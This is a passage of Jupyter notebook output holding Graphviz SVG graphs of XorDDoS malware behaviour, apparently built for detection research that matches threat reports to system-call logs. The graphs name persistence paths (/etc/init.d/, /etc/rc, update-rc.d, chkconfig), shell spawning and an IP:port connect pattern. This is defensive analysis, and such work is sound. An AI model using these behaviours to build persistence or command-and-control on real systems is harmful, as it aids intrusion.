3221.13,-193.83 3226.85,-202.74 3231.16,-197.23\"/>\n<text text-anchor=\"middle\" x=\"3287.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">73.getsockname</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge47\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.86,-263.03C2881.67,-260.39 3315.12,-251.7 3336.73,-229 3364.3,-200.05 3307.76,-187.84 3258.28,-182.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3258.47,-179.2 3248.19,-181.74 3257.81,-186.17 3258.47,-179.2\"/>\n<text text-anchor=\"middle\" x=\"3384.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">72.setsockopt</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3550.73\" cy=\"-178\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3550.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge48\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702,-263.98C2875.39,-263.41 3290.97,-258.84 3427.73,-229 3458.35,-222.32 3491.14,-208.63 3515.16,-197.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3516.75,-200.38 3524.23,-192.88 3513.71,-194.08 3516.75,-200.38\"/>\n<text text-anchor=\"middle\" x=\"3496.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.lseek</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge49\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.77,-263.07C2913.2,-260.23 3489.14,-250.56 3523.73,-229 3532.34,-223.64 3538.39,-214.52 3542.55,-205.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3545.89,-206.58 3546.35,-196 3539.39,-203.99 3545.89,-206.58\"/>\n<text text-anchor=\"middle\" x=\"3560.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge50\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.29,-264.08C2925.77,-263.93 3557.18,-260.69 3587.73,-229 3596.04,-220.39 3590.23,-209.87 3580.97,-200.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3583.2,-198.01 3573.38,-194.01 3578.57,-203.26 3583.2,-198.01\"/>\n<text text-anchor=\"middle\" x=\"3614.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">15.write</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3639.73\" cy=\"-91\" rx=\"37.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3639.73\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/sed</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge51\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.4,-264.24C2934.39,-264.56 3608.28,-262.6 3640.73,-229 3655.3,-213.92 3649.33,-154.66 3644.2,-119.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3647.62,-118.4 3642.66,-109.04 3640.7,-119.45 3647.62,-118.4\"/>\n<text text-anchor=\"middle\" x=\"3669.23\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">37.stat</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3704.73\" cy=\"-18\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3704.73\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^pipe($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge52\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.6,-262.97C2933.87,-259.65 3615.2,-248.3 3658.73,-229 3724.38,-199.9 3717.34,-95.94 3709.78,-46.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3713.21,-45.32 3708.14,-36.01 3706.3,-46.45 3713.21,-45.32\"/>\n<text text-anchor=\"middle\" x=\"3735.73\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.pipe</text>\n</g>\n<!-- 15 -->\n<g id=\"node16\" class=\"node\">\n<title>15</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3782.73\" cy=\"-178\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3782.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/insserv</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge53\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.35,-264.19C2935.76,-264.4 3620.99,-262.15 3715.73,-229 3720.31,-227.4 3738.38,-213.83 3754.6,-201.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3757.11,-203.72 3762.84,-194.81 3752.8,-198.2 3757.11,-203.72\"/>\n<text text-anchor=\"middle\" x=\"3756.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.stat</text>\n</g>\n<!-- 16 -->\n<g id=\"node17\" class=\"node\">\n<title>16</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3915.73\" cy=\"-178\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3915.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge54\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.22,-264.07C2943.95,-263.94 3674.1,-260.9 3775.73,-229 3787.38,-225.35 3787.66,-219.14 3798.73,-214 3821.42,-203.48 3848.03,-195.22 3870.14,-189.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3871.14,-192.74 3879.95,-186.86 3869.4,-185.96 3871.14,-192.74\"/>\n<text text-anchor=\"middle\" x=\"3821.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge55\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.46,-264.37C2954.18,-265.2 3736.98,-264.84 3844.73,-229 3847.25,-228.16 3868.38,-213.19 3886.95,-199.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3889.15,-202.57 3895.22,-193.88 3885.06,-196.89 3889.15,-202.57\"/>\n<text text-anchor=\"middle\" x=\"3892.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge56\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.81,-263.35C2977.21,-260.86 3897.41,-250.9 3918.73,-229 3924.6,-222.97 3925.61,-214.37 3924.59,-205.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3927.99,-205.15 3922.53,-196.07 3921.13,-206.57 3927.99,-205.15\"/>\n<text text-anchor=\"middle\" x=\"3948.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge57\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.26,-263.44C2986.1,-261.21 3953.39,-251.93 3975.73,-229 3987.74,-216.68 3973.11,-204.29 3955.29,-194.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3956.33,-191.54 3945.81,-190.32 3953.27,-197.84 3956.33,-191.54\"/>\n<text text-anchor=\"middle\" x=\"4002.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">60.write</text>\n</g>\n<!-- 17 -->\n<g id=\"node18\" class=\"node\">\n<title>17</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4162.73\" cy=\"-178\" rx=\"148.67\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4162.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">d{1,3}.d{1,3}.d{1,3}.d{1,3}:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge58\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.09,-263.57C2977.18,-261.83 3898.64,-254.16 4028.73,-229 4045.47,-225.76 4082.8,-211.62 4113.82,-199.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4115.24,-202.39 4123.21,-195.41 4112.63,-195.9 4115.24,-202.39\"/>\n<text text-anchor=\"middle\" x=\"4105.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">67.connect</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge59\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.85,-263.34C3006.42,-260.57 4110.56,-249.19 4140.73,-229 4148.64,-223.71 4153.72,-214.9 4156.99,-206.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4160.38,-207.02 4159.95,-196.44 4153.68,-204.98 4160.38,-207.02\"/>\n<text text-anchor=\"middle\" x=\"4192.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">65._newselect</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge60\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.07,-263.78C3019.71,-262.68 4208.62,-256.71 4235.73,-229 4246.6,-217.89 4237.48,-207.76 4222.48,-199.56\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4223.59,-196.21 4213.07,-194.97 4220.52,-202.5 4223.59,-196.21\"/>\n<text text-anchor=\"middle\" x=\"4261.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">63.send</text>\n</g>\n<!-- 18 -->\n<g id=\"node19\" class=\"node\">\n<title>18</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4384.73\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4384.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge61\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.9,-263.35C3019.19,-260.53 4210.15,-248.69 4287.73,-229 4312.98,-222.59 4339.09,-208.64 4357.86,-197.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4359.86,-199.98 4366.44,-191.68 4356.12,-194.06 4359.86,-199.98\"/>\n<text text-anchor=\"middle\" x=\"4355.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">24.waitpid</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge62\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.2,-263.93C3038.81,-263.43 4358.81,-259.53 4388.73,-229 4394.78,-222.83 4395.54,-213.94 4394.2,-205.36\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4397.6,-204.51 4391.86,-195.61 4390.8,-206.15 4397.6,-204.51\"/>\n<text text-anchor=\"middle\" x=\"4417.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">23.clone</text>\n</g>\n<!-- 19 -->\n<g id=\"node20\" class=\"node\">\n<title>19</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4551.73\" cy=\"-178\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4551.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge63\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.02,-263.42C3038.13,-260.77 4359.79,-249.12 4445.73,-229 4460.56,-225.53 4494.26,-209.04 4519.72,-195.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4521.4,-198.99 4528.67,-191.28 4518.18,-192.78 4521.4,-198.99\"/>\n<text text-anchor=\"middle\" x=\"4504.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.write</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge64\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.12,-263.71C3054.39,-262.25 4491.09,-254.73 4529.73,-229 4537.76,-223.65 4542.89,-214.66 4546.14,-205.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4549.56,-206.55 4549.08,-195.96 4542.86,-204.54 4549.56,-206.55\"/>\n<text text-anchor=\"middle\" x=\"4558.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.rm</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge65\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.98,-264.08C3060.39,-264.28 4545.29,-263.05 4578.73,-229 4586.33,-221.27 4582.44,-210.97 4575.52,-201.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4578.03,-199.29 4568.87,-193.97 4572.72,-203.84 4578.03,-199.29\"/>\n<text text-anchor=\"middle\" x=\"4602.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">32.lstat</text>\n</g>\n<!-- 20 -->\n<g id=\"node21\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4679.73\" cy=\"-178\" rx=\"38.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4679.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/selinux</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge66\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.01,-264.21C3059.13,-264.97 4536.22,-265.88 4626.73,-229 4640.05,-223.58 4651.98,-213.12 4661.14,-203.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4663.97,-205.24 4667.86,-195.39 4658.67,-200.66 4663.97,-205.24\"/>\n<text text-anchor=\"middle\" x=\"4673.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.statfs</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge67\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.15,-264.17C3074.64,-264.79 4666.02,-265.32 4701.73,-229 4708.79,-221.83 4706.22,-212.01 4700.79,-202.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4703.55,-200.82 4694.93,-194.66 4697.83,-204.85 4703.55,-200.82\"/>\n<text text-anchor=\"middle\" x=\"4733.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.access</text>\n</g>\n<!-- 21 -->\n<g id=\"node22\" class=\"node\">\n<title>21</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4750.73\" cy=\"-91\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4750.73\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;21 -->\n<g id=\"edge68\" class=\"edge\">\n<title>Start&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.28,-264.21C3081.93,-265.04 4727.86,-266.49 4764.73,-229 4779.58,-213.91 4767.2,-154.18 4758.15,-118.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4761.52,-117.83 4755.59,-109.05 4754.75,-119.61 4761.52,-117.83\"/>\n<text text-anchor=\"middle\" x=\"4793.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.open</text>\n</g>\n<!-- 22 -->\n<g id=\"node23\" class=\"node\">\n<title>22</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4836.73\" cy=\"-18\" rx=\"100.98\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4836.73\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">permission(s|:)[0&#45;9]{1,4}</text>\n</g>\n<!-- Start&#45;&gt;22 -->\n<g id=\"edge69\" class=\"edge\">\n<title>Start&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.27,-264.2C3076.56,-264.99 4682.66,-266.21 4781.73,-229 4849.92,-203.39 4846.5,-96.78 4840.73,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4844.2,-45.61 4839.49,-36.12 4837.26,-46.48 4844.2,-45.61\"/>\n<text text-anchor=\"middle\" x=\"4867.73\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.umask</text>\n</g>\n<!-- 23 -->\n<g id=\"node24\" class=\"node\">\n<title>23</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4919.73\" cy=\"-178\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4919.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;23 -->\n<g id=\"edge70\" class=\"edge\">\n<title>Start&#45;&gt;23</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.15,-264.09C3083.35,-264.37 4746.88,-263.58 4850.73,-229 4867.43,-223.44 4883.51,-212.25 4895.94,-201.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4898.31,-204.44 4903.55,-195.23 4893.71,-199.17 4898.31,-204.44\"/>\n<text text-anchor=\"middle\" x=\"4902.73\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.clone</text>\n</g>\n<!-- 24 -->\n<g id=\"node25\" class=\"node\">\n<title>24</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5010.73\" cy=\"-91\" rx=\"31.7\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5010.73\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sed$</text>\n</g>\n<!-- Start&#45;&gt;24 -->\n<g id=\"edge71\" class=\"edge\">\n<title>Start&#45;&gt;24</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.97,-263.99C3091,-263.79 4821.68,-261.07 4930.73,-229 4957.36,-221.17 4967.3,-218.36 4983.73,-196 5000.26,-173.53 5006.69,-141.82 5009.18,-119.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5012.69,-119.4 5010.12,-109.13 5005.72,-118.77 5012.69,-119.4\"/>\n<text text-anchor=\"middle\" x=\"5021.23\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.exec</text>\n</g>\n<!-- 25 -->\n<g id=\"node26\" class=\"node\">\n<title>25</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5081.73\" cy=\"-18\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5081.73\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- Start&#45;&gt;25 -->\n<g id=\"edge72\" class=\"edge\">\n<title>Start&#45;&gt;25</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2701.94,-263.61C3093.8,-261.54 4848.57,-251.07 4961.73,-229 5001.51,-221.24 5020.69,-227.05 5046.73,-196 5082.55,-153.29 5085.49,-84.44 5083.95,-46.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5087.42,-45.92 5083.39,-36.12 5080.43,-46.3 5087.42,-45.92\"/>\n<text text-anchor=\"middle\" x=\"5101.73\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.clone</text>\n</g>\n<!-- 26 -->\n<g id=\"node27\" class=\"node\">\n<title>26</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"5159.73\" cy=\"-178\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"5159.73\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/openrc</text>\n</g>\n<!-- Start&#45;&gt;26 -->\n<g id=\"edge73\" class=\"edge\">\n<title>Start&#45;&gt;26</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2702.15,-263.58C3114.68,-261.26 5037.94,-249.36 5095.73,-229 5111.29,-223.52 5126,-212.6 5137.38,-202.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"5139.83,-204.87 5144.7,-195.46 5135.02,-199.78 5139.83,-204.87\"/>\n<text text-anchor=\"middle\" x=\"5141.23\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.stat</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.sources.Source at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"588pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 587.79 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 583.79,-127 583.79,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"83\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"83\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"39\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"39\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.52,-87.73C51.39,-82.52 45.58,-76.2 42,-69 38.53,-62.04 37.12,-53.85 36.75,-46.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"40.25,-46.08 36.8,-36.06 33.25,-46.04 40.25,-46.08\"/>\n<text text-anchor=\"middle\" x=\"74\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.hardcode</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"128\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"128\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M95.05,-86.91C98.76,-81.32 102.73,-75 106,-69 110.07,-61.5 114,-53.1 117.38,-45.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"120.67,-46.57 121.34,-36 114.22,-43.84 120.67,-46.57\"/>\n<text text-anchor=\"middle\" x=\"137.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"212\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"212\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"310\" cy=\"-105\" rx=\"46.29\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"310\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">UID($|.|$)</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"421\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"421\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"533\" cy=\"-105\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"533\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Intezer.csv\n"
     ]
    },
    {
     "data": {
